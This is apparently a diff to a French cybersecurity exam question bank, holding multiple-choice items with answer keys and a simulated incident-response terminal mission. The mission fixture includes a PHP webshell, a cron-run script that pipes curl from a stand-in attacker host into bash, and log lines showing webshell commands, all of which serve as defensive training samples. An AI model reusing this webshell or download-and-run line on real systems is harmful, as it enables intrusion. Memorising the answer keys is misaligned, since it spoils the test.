+   "prompt": "Trois vulnérabilités sont signalées :\n1. CVSS 6.5 sur l'intranet, exploitable seulement avec un compte administrateur\n2. CVSS 10.0 sur un serveur de test éteint et débranché du réseau\n3. CVSS 8.8 sur le serveur de messagerie exposé à Internet, avec un code d'exploitation public\nLaquelle corrigez-vous en premier ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "La n° 1"
+    },
+    {
+     "id": "b",
+     "text": "La n° 2"
+    },
+    {
+     "id": "c",
+     "text": "La n° 3"
+    },
+    {
+     "id": "d",
+     "text": "Les trois en même temps, dans l'ordre des scores"
+    }
+   ],
+   "correct": [
+    "c"
+   ],
+   "points": 1,
+   "explanation": "L'exposition à Internet et l'existence d'un code d'exploitation public rendent la n° 3 la plus urgente, malgré un score inférieur à la n° 2, qui n'est pas atteignable."
+  },
+  {
    "position": 49,
+   "variant_group": "mastere-q49",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Analyse et diagnostic",
    "prompt": "Depuis ce matin, les utilisateurs reçoivent une alerte de certificat en ouvrant l'intranet. Aucune configuration n'a été modifiée. Que vérifiez-vous en premier ?",
@@ -1430,7 +3027,40 @@
    "explanation": "Sans changement de configuration, l'expiration est la cause la plus fréquente. Si le certificat est valide, on envisage une interception (homme du milieu)."
   },
   {
+   "position": 49,
+   "variant_group": "mastere-q49",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Analyse et diagnostic",
+   "prompt": "Depuis ce matin, un serveur membre du domaine n'arrive plus à authentifier les utilisateurs et renvoie une erreur Kerberos. Aucune configuration n'a été modifiée. Que vérifiez-vous en premier ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Les règles du pare-feu local"
+    },
+    {
+     "id": "b",
+     "text": "La synchronisation de l'horloge du serveur"
+    },
+    {
+     "id": "c",
+     "text": "La configuration DHCP du serveur"
+    },
+    {
+     "id": "d",
+     "text": "La taille du journal Sécurité"
+    }
+   ],
+   "correct": [
+    "b"
+   ],
+   "points": 1,
+   "explanation": "Kerberos refuse les tickets si l'écart d'horloge dépasse 5 minutes par défaut : une dérive de l'heure (NTP défaillant) est une cause classique sans changement de configuration."
+  },
+  {
    "position": 50,
+   "variant_group": "mastere-q50",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Analyse et diagnostic",
    "prompt": "Le SIEM signale qu'un même compte s'est connecté à 9 h 02 depuis Paris, puis à 9 h 10 depuis Singapour. Comment l'interprétez-vous ?",
@@ -1457,6 +3087,189 @@
    ],
    "points": 1,
    "explanation": "Huit minutes ne permettent pas de changer de continent : soit un VPN explique la localisation, soit les identifiants sont utilisés par un tiers."
+  },
+  {
+   "position": 50,
+   "variant_group": "mastere-q50",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Analyse et diagnostic",
+   "prompt": "Le SIEM signale, pour un même compte, 40 échecs de connexion en 3 minutes puis une connexion réussie, à 3 h du matin, depuis une adresse IP étrangère jamais vue. Comment l'interprétez-vous ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Une compromission probable : on suspend le compte, on réinitialise et on analyse"
+    },
+    {
+     "id": "b",
+     "text": "Un faux positif : la connexion a fini par réussir, le compte est donc légitime"
+    },
+    {
+     "id": "c",
+     "text": "Un comportement normal pour un utilisateur qui a oublié son mot de passe"
+    },
+    {
+     "id": "d",
+     "text": "Une panne du SIEM, qui a mal horodaté une partie des connexions"
+    }
+   ],
+   "correct": [
+    "a"
+   ],
+   "points": 1,
+   "explanation": "Une rafale d'échecs suivie d'un succès depuis une source inhabituelle évoque une force brute réussie : on traite le compte comme compromis."
+  },
+  {
+   "position": 51,
+   "variant_group": null,
+   "variant": null,
+   "type": "terminal",
+   "domain": "Mission terminal",
+   "prompt": "Mission terminal (environ 8 minutes). Un serveur web a été compromis cette nuit : enquêtez et remédiez en ligne de commande. Chaque mission réussie rapporte 1 point ; elles se valident toutes seules.",
+   "options": null,
+   "correct": null,
+   "points": 4,
+   "scenario": {
+    "user": "analyste",
+    "hostname": "web-boutique",
+    "home": "/home/analyste",
+    "motd": "Alerte EDR : exécution de commandes inhabituelles par le serveur web cette nuit.\nLis ~/INCIDENT.txt, puis remplis les missions. Tape « help » pour la liste des commandes.",
+    "files": {
+     "/home/analyste/INCIDENT.txt": "Incident 2026-114, sévérité haute\n---------------------------------\n1. Trouve dans les journaux web l'adresse IP de l'attaquant et écris-la, seule, dans ~/ioc/ip.txt\n2. L'attaquant a déposé un webshell dans le site : supprime-le.\n3. Il a installé une persistance qui contacte son serveur toutes les 10 minutes : supprime le script appelé.\n4. Le fichier de configuration du site, qui contient le mot de passe de la base, est lisible par tous :\n   donne-lui les droits 640.\nLe dossier ~/ioc n'existe pas encore.\n",
+     "/var/log/nginx/access.log": "192.0.2.131 - - [30/Oct/2026:07:53:30 +0100] \"GET /produits HTTP/1.1\" 200 8309\n192.0.2.150 - - [30/Oct/2026:06:18:10 +0100] \"GET /panier HTTP/1.1\" 200 1667\n192.0.2.188 - - [30/Oct/2026:09:50:36 +0100] \"GET /static/app.js HTTP/1.1\" 200 5747\n192.0.2.141 - - [30/Oct/2026:08:15:57 +0100] \"GET /static/app.js HTTP/1.1\" 200 544\n192.0.2.176 - - [30/Oct/2026:08:25:17 +0100] \"GET /panier HTTP/1.1\" 200 4210\n192.0.2.87 - - [30/Oct/2026:07:29:57 +0100] \"GET /static/app.js HTTP/1.1\" 200 371\n192.0.2.17 - - [30/Oct/2026:08:57:21 +0100] \"GET /panier HTTP/1.1\" 200 1790\n192.0.2.72 - - [30/Oct/2026:09:58:20 +0100] \"GET /static/app.js HTTP/1.1\" 200 8434\n192.0.2.179 - - [30/Oct/2026:09:17:14 +0100] \"GET /produits HTTP/1.1\" 200 265\n192.0.2.166 - - [30/Oct/2026:08:19:36 +0100] \"GET /contact HTTP/1.1\" 200 532\n192.0.2.123 - - [30/Oct/2026:08:19:34 +0100] \"GET / HTTP/1.1\" 200 7475\n192.0.2.160 - - [30/Oct/2026:06:16:24 +0100] \"GET /contact HTTP/1.1\" 200 7471\n192.0.2.27 - - [30/Oct/2026:09:27:38 +0100] \"GET /panier HTTP/1.1\" 200 5072\n192.0.2.74 - - [30/Oct/2026:09:57:49 +0100] \"GET /panier HTTP/1.1\" 200 7892\n192.0.2.85 - - [30/Oct/2026:08:20:16 +0100] \"GET /static/app.js HTTP/1.1\" 200 701\n192.0.2.62 - - [30/Oct/2026:07:54:28 +0100] \"GET /panier HTTP/1.1\" 200 3883\n192.0.2.187 - - [30/Oct/2026:08:20:16 +0100] \"GET /produits HTTP/1.1\" 200 6510\n192.0.2.42 - - [30/Oct/2026:08:51:44 +0100] \"GET /panier HTTP/1.1\" 200 3602\n192.0.2.167 - - [30/Oct/2026:08:44:44 +0100] \"GET /panier HTTP/1.1\" 200 4519\n192.0.2.98 - - [30/Oct/2026:09:25:21 +0100] \"GET /static/app.js HTTP/1.1\" 200 5148\n192.0.2.19 - - [30/Oct/2026:07:29:20 +0100] \"GET /panier HTTP/1.1\" 200 2248\n192.0.2.123 - - [30/Oct/2026:09:50:41 +0100] \"GET / HTTP/1.1\" 200 5231\n192.0.2.198 - - [30/Oct/2026:06:48:42 +0100] \"GET /contact HTTP/1.1\" 200 5081\n192.0.2.115 - - [30/Oct/2026:07:54:50 +0100] \"GET /static/app.js HTTP/1.1\" 200 8570\n192.0.2.83 - - [30/Oct/2026:08:32:58 +0100] \"GET /panier HTTP/1.1\" 200 8813\n192.0.2.66 - - [30/Oct/2026:06:36:43 +0100] \"GET /panier HTTP/1.1\" 200 6547\n192.0.2.169 - - [30/Oct/2026:08:25:45 +0100] \"GET /static/app.js HTTP/1.1\" 200 6391\n192.0.2.101 - - [30/Oct/2026:06:16:25 +0100] \"GET /produits HTTP/1.1\" 200 3064\n192.0.2.135 - - [30/Oct/2026:09:40:20 +0100] \"GET /panier HTTP/1.1\" 200 8605\n192.0.2.58 - - [30/Oct/2026:08:11:44 +0100] \"GET / HTTP/1.1\" 200 1862\n192.0.2.39 - - [30/Oct/2026:07:35:17 +0100] \"GET /panier HTTP/1.1\" 200 5885\n192.0.2.172 - - [30/Oct/2026:06:36:25 +0100] \"GET /contact HTTP/1.1\" 200 5288\n192.0.2.10 - - [30/Oct/2026:06:14:58 +0100] \"GET /contact HTTP/1.1\" 200 2668\n192.0.2.127 - - [30/Oct/2026:09:16:51 +0100] \"GET / HTTP/1.1\" 200 3324\n192.0.2.151 - - [30/Oct/2026:09:31:48 +0100] \"GET /produits HTTP/1.1\" 200 2241\n192.0.2.32 - - [30/Oct/2026:08:25:19 +0100] \"GET /panier HTTP/1.1\" 200 7839\n192.0.2.35 - - [30/Oct/2026:09:58:18 +0100] \"GET / HTTP/1.1\" 200 537\n192.0.2.185 - - [30/Oct/2026:09:37:14 +0100] \"GET /panier HTTP/1.1\" 200 8357\n192.0.2.25 - - [30/Oct/2026:09:40:32 +0100] \"GET / HTTP/1.1\" 200 970\n192.0.2.114 - - [30/Oct/2026:07:37:50 +0100] \"GET / HTTP/1.1\" 200 4390\n192.0.2.192 - - [30/Oct/2026:07:37:16 +0100] \"GET /contact HTTP/1.1\" 200 2967\n192.0.2.12 - - [30/Oct/2026:07:48:48 +0100] \"GET /contact HTTP/1.1\" 200 4429\n192.0.2.121 - - [30/Oct/2026:06:54:24 +0100] \"GET /contact HTTP/1.1\" 200 1442\n192.0.2.115 - - [30/Oct/2026:06:46:59 +0100] \"GET /static/app.js HTTP/1.1\" 200 4528\n192.0.2.91 - - [30/Oct/2026:09:49:47 +0100] \"GET /contact HTTP/1.1\" 200 4032\n192.0.2.199 - - [30/Oct/2026:07:43:36 +0100] \"GET /contact HTTP/1.1\" 200 757\n192.0.2.152 - - [30/Oct/2026:08:43:39 +0100] \"GET /contact HTTP/1.1\" 200 6973\n192.0.2.199 - - [30/Oct/2026:08:23:55 +0100] \"GET /static/app.js HTTP/1.1\" 200 7437\n192.0.2.51 - - [30/Oct/2026:08:43:29 +0100] \"GET /contact HTTP/1.1\" 200 5300\n192.0.2.38 - - [30/Oct/2026:07:10:22 +0100] \"GET /static/app.js HTTP/1.1\" 200 5731\n192.0.2.188 - - [30/Oct/2026:08:56:50 +0100] \"GET / HTTP/1.1\" 200 5712\n192.0.2.113 - - [30/Oct/2026:09:49:39 +0100] \"GET /static/app.js HTTP/1.1\" 200 6365\n192.0.2.182 - - [30/Oct/2026:06:33:37 +0100] \"GET /panier HTTP/1.1\" 200 5515\n192.0.2.155 - - [30/Oct/2026:09:32:10 +0100] \"GET /contact HTTP/1.1\" 200 6529\n192.0.2.198 - - [30/Oct/2026:08:26:40 +0100] \"GET / HTTP/1.1\" 200 6101\n192.0.2.115 - - [30/Oct/2026:09:12:48 +0100] \"GET / HTTP/1.1\" 200 5016\n192.0.2.148 - - [30/Oct/2026:06:17:59 +0100] \"GET /contact HTTP/1.1\" 200 7273\n192.0.2.76 - - [30/Oct/2026:09:29:55 +0100] \"GET /contact HTTP/1.1\" 200 236\n192.0.2.62 - - [30/Oct/2026:07:13:14 +0100] \"GET /produits HTTP/1.1\" 200 3092\n192.0.2.22 - - [30/Oct/2026:08:49:44 +0100] \"GET /panier HTTP/1.1\" 200 1889\n203.0.113.77 - - [30/Oct/2026:02:14:03 +0100] \"GET /admin/upload.php HTTP/1.1\" 200 812\n203.0.113.77 - - [30/Oct/2026:02:14:20 +0100] \"POST /admin/upload.php HTTP/1.1\" 200 64\n203.0.113.77 - - [30/Oct/2026:02:14:31 +0100] \"GET /uploads/img_4471.php?c=id HTTP/1.1\" 200 54\n203.0.113.77 - - [30/Oct/2026:02:15:02 +0100] \"GET /uploads/img_4471.php?c=crontab%20-l HTTP/1.1\" 200 12\n192.0.2.183 - - [30/Oct/2026:06:28:18 +0100] \"GET / HTTP/1.1\" 200 7054\n192.0.2.68 - - [30/Oct/2026:06:54:14 +0100] \"GET / HTTP/1.1\" 200 1376\n192.0.2.160 - - [30/Oct/2026:09:12:18 +0100] \"GET /panier HTTP/1.1\" 200 592\n192.0.2.83 - - [30/Oct/2026:09:33:45 +0100] \"GET /panier HTTP/1.1\" 200 3315\n192.0.2.23 - - [30/Oct/2026:09:29:19 +0100] \"GET /contact HTTP/1.1\" 200 8984\n192.0.2.52 - - [30/Oct/2026:09:55:13 +0100] \"GET / HTTP/1.1\" 200 7628\n192.0.2.156 - - [30/Oct/2026:09:40:38 +0100] \"GET /produits HTTP/1.1\" 200 213\n192.0.2.83 - - [30/Oct/2026:06:18:37 +0100] \"GET /produits HTTP/1.1\" 200 4619\n192.0.2.199 - - [30/Oct/2026:09:43:49 +0100] \"GET /produits HTTP/1.1\" 200 3567\n192.0.2.92 - - [30/Oct/2026:07:58:54 +0100] \"GET /contact HTTP/1.1\" 200 708\n192.0.2.36 - - [30/Oct/2026:07:39:34 +0100] \"GET / HTTP/1.1\" 200 6088\n192.0.2.110 - - [30/Oct/2026:06:10:33 +0100] \"GET /static/app.js HTTP/1.1\" 200 1719\n192.0.2.80 - - [30/Oct/2026:07:22:31 +0100] \"GET /contact HTTP/1.1\" 200 1720\n192.0.2.87 - - [30/Oct/2026:06:44:14 +0100] \"GET /produits HTTP/1.1\" 200 7801\n192.0.2.152 - - [30/Oct/2026:08:18:20 +0100] \"GET /produits HTTP/1.1\" 200 3381\n192.0.2.151 - - [30/Oct/2026:08:53:17 +0100] \"GET /panier HTTP/1.1\" 200 4318\n192.0.2.160 - - [30/Oct/2026:09:33:22 +0100] \"GET /produits HTTP/1.1\" 200 3116\n192.0.2.102 - - [30/Oct/2026:09:14:50 +0100] \"GET /static/app.js HTTP/1.1\" 200 2416\n192.0.2.169 - - [30/Oct/2026:08:44:13 +0100] \"GET /static/app.js HTTP/1.1\" 200 5854\n192.0.2.67 - - [30/Oct/2026:08:40:50 +0100] \"GET / HTTP/1.1\" 200 5203\n192.0.2.48 - - [30/Oct/2026:08:39:35 +0100] \"GET / HTTP/1.1\" 200 3605\n192.0.2.88 - - [30/Oct/2026:06:26:53 +0100] \"GET /panier HTTP/1.1\" 200 1377\n192.0.2.132 - - [30/Oct/2026:08:28:29 +0100] \"GET /produits HTTP/1.1\" 200 975\n192.0.2.27 - - [30/Oct/2026:08:58:37 +0100] \"GET / HTTP/1.1\" 200 3501\n192.0.2.177 - - [30/Oct/2026:07:44:10 +0100] \"GET / HTTP/1.1\" 200 5363\n192.0.2.61 - - [30/Oct/2026:06:50:30 +0100] \"GET / HTTP/1.1\" 200 4345\n192.0.2.137 - - [30/Oct/2026:09:53:31 +0100] \"GET /static/app.js HTTP/1.1\" 200 3786\n192.0.2.20 - - [30/Oct/2026:08:53:46 +0100] \"GET /panier HTTP/1.1\" 200 8205\n192.0.2.186 - - [30/Oct/2026:09:13:50 +0100] \"GET /contact HTTP/1.1\" 200 6148\n192.0.2.61 - - [30/Oct/2026:08:45:50 +0100] \"GET /static/app.js HTTP/1.1\" 200 5842\n192.0.2.113 - - [30/Oct/2026:06:50:51 +0100] \"GET / HTTP/1.1\" 200 7300\n192.0.2.129 - - [30/Oct/2026:06:51:48 +0100] \"GET / HTTP/1.1\" 200 7940\n192.0.2.47 - - [30/Oct/2026:09:35:17 +0100] \"GET /contact HTTP/1.1\" 200 2193\n192.0.2.77 - - [30/Oct/2026:06:25:37 +0100] \"GET /produits HTTP/1.1\" 200 3601\n192.0.2.81 - - [30/Oct/2026:07:39:53 +0100] \"GET / HTTP/1.1\" 200 2186\n192.0.2.19 - - [30/Oct/2026:09:32:21 +0100] \"GET /panier HTTP/1.1\" 200 2367\n192.0.2.60 - - [30/Oct/2026:08:21:29 +0100] \"GET /panier HTTP/1.1\" 200 4888\n192.0.2.118 - - [30/Oct/2026:09:45:37 +0100] \"GET /produits HTTP/1.1\" 200 1665\n192.0.2.111 - - [30/Oct/2026:09:33:23 +0100] \"GET /static/app.js HTTP/1.1\" 200 8223\n192.0.2.77 - - [30/Oct/2026:08:55:25 +0100] \"GET /contact HTTP/1.1\" 200 1656\n192.0.2.59 - - [30/Oct/2026:08:21:15 +0100] \"GET /panier HTTP/1.1\" 200 3080\n192.0.2.66 - - [30/Oct/2026:07:29:49 +0100] \"GET /panier HTTP/1.1\" 200 7843\n192.0.2.126 - - [30/Oct/2026:06:27:56 +0100] \"GET /contact HTTP/1.1\" 200 1703\n192.0.2.171 - - [30/Oct/2026:06:27:59 +0100] \"GET /panier HTTP/1.1\" 200 5707\n192.0.2.188 - - [30/Oct/2026:06:58:34 +0100] \"GET /static/app.js HTTP/1.1\" 200 8573\n192.0.2.120 - - [30/Oct/2026:08:36:15 +0100] \"GET / HTTP/1.1\" 200 4789\n192.0.2.40 - - [30/Oct/2026:06:43:18 +0100] \"GET /produits HTTP/1.1\" 200 5535\n192.0.2.157 - - [30/Oct/2026:08:24:26 +0100] \"GET /static/app.js HTTP/1.1\" 200 4626\n192.0.2.13 - - [30/Oct/2026:08:20:46 +0100] \"GET /contact HTTP/1.1\" 200 8081\n192.0.2.81 - - [30/Oct/2026:09:43:58 +0100] \"GET / HTTP/1.1\" 200 2311\n192.0.2.78 - - [30/Oct/2026:08:35:10 +0100] \"GET /produits HTTP/1.1\" 200 6603\n192.0.2.33 - - [30/Oct/2026:08:35:58 +0100] \"GET /static/app.js HTTP/1.1\" 200 324\n192.0.2.199 - - [30/Oct/2026:06:14:13 +0100] \"GET / HTTP/1.1\" 200 903\n192.0.2.170 - - [30/Oct/2026:08:50:18 +0100] \"GET / HTTP/1.1\" 200 544\n192.0.2.135 - - [30/Oct/2026:06:59:11 +0100] \"GET /static/app.js HTTP/1.1\" 200 1973\n192.0.2.123 - - [30/Oct/2026:06:22:58 +0100] \"GET /static/app.js HTTP/1.1\" 200 2753\n192.0.2.136 - - [30/Oct/2026:07:24:12 +0100] \"GET /contact HTTP/1.1\" 200 7621\n192.0.2.18 - - [30/Oct/2026:07:12:29 +0100] \"GET /static/app.js HTTP/1.1\" 200 8450\n192.0.2.132 - - [30/Oct/2026:09:54:43 +0100] \"GET / HTTP/1.1\" 200 7089\n192.0.2.191 - - [30/Oct/2026:09:14:16 +0100] \"GET /contact HTTP/1.1\" 200 6765\n",
+     "/var/www/html/index.php": {
+      "content": "<?php require 'config.php'; ?>\n<h1>Boutique</h1>\n",
+      "owner": "analyste",
+      "mode": "644"
+     },
+     "/var/www/html/config.php": {
+      "content": "<?php\n$db_user = 'boutique';\n$db_pass = 'Sup3rS3cret-2026';\n",
+      "owner": "analyste",
+      "mode": "644"
+     },
+     "/var/www/html/uploads/img_4470.jpg": {
+      "content": "(image)",
+      "owner": "analyste",
+      "mode": "644"
+     },
+     "/var/www/html/uploads/img_4471.php": {
+      "content": "<?php echo shell_exec($_GET['c']); ?>\n",
+      "owner": "analyste",
+      "mode": "644"
+     },
+     "/var/www/html/uploads/img_4472.jpg": {
+      "content": "(image)",
+      "owner": "analyste",
+      "mode": "644"
+     },
+     "/var/tmp/.cache/sync.sh": {
+      "content": "#!/bin/bash\ncurl -s http://203.0.113.77:8080/b | bash\n",
+      "owner": "analyste",
+      "mode": "755"
+     },
+     "/etc/hostname": "web-boutique\n",
+     "/home/analyste/notes.txt": "Penser à regarder les tâches planifiées (crontab -l) et les dossiers temporaires.\n"
+    },
+    "dirs": [
+     {
+      "path": "/var/www/html/uploads",
+      "owner": "analyste",
+      "mode": "755"
+     },
+     {
+      "path": "/var/tmp/.cache",
+      "owner": "analyste",
+      "mode": "755"
+     }
+    ],
+    "denied": [
+     "/root"
+    ],
+    "crontab": "*/10 * * * * /var/tmp/.cache/sync.sh >/dev/null 2>&1",
+    "processes": [
+     {
+      "pid": 1,
+      "user": "root",
+      "cmd": "/sbin/init",
+      "cpu": 0.0,
+      "mem": 0.1
+     },
+     {
+      "pid": 501,
+      "user": "root",
+      "cmd": "nginx: master process",
+      "cpu": 0.0,
+      "mem": 0.5
+     },
+     {
+      "pid": 502,
+      "user": "analyste",
+      "cmd": "php-fpm: pool www",
+      "cpu": 0.8,
+      "mem": 2.1
+     },
+     {
+      "pid": 777,
+      "user": "analyste",
+      "cmd": "-bash",
+      "cpu": 0.0,
+      "mem": 0.2
+     }
+    ],
+    "listen": [
+     {
+      "port": 80,
+      "process": "nginx"
+     },
+     {
+      "port": 22,
+      "process": "sshd"
+     }
+    ],
+    "interfaces": [
+     {
+      "name": "eth0",
+      "ip": "198.51.100.20/24"
+     }
+    ],
+    "objectives": [
+     {
+      "id": "ip",
+      "title": "Écrire l'IP de l'attaquant dans ~/ioc/ip.txt",
+      "check": {
+       "type": "equals",
+       "path": "/home/analyste/ioc/ip.txt",
+       "text": "203.0.113.77"
+      }
+     },
+     {
+      "id": "webshell",
+      "title": "Supprimer le webshell",
+      "check": {
+       "type": "absent",
+       "path": "/var/www/html/uploads/img_4471.php"
+      }
+     },
+     {
+      "id": "persist",
+      "title": "Supprimer le script de persistance",
+      "check": {
+       "type": "absent",
+       "path": "/var/tmp/.cache/sync.sh"
+      }
+     },
+     {
+      "id": "config",
+      "title": "Mettre config.php en 640",
+      "check": {
+       "type": "mode",
+       "path": "/var/www/html/config.php",
+       "mode": "640"
+      }
+     }
+    ]
+   },
+   "explanation": "Missions vérifiées automatiquement sur l'état de la machine simulée."
   }
  ]
 }
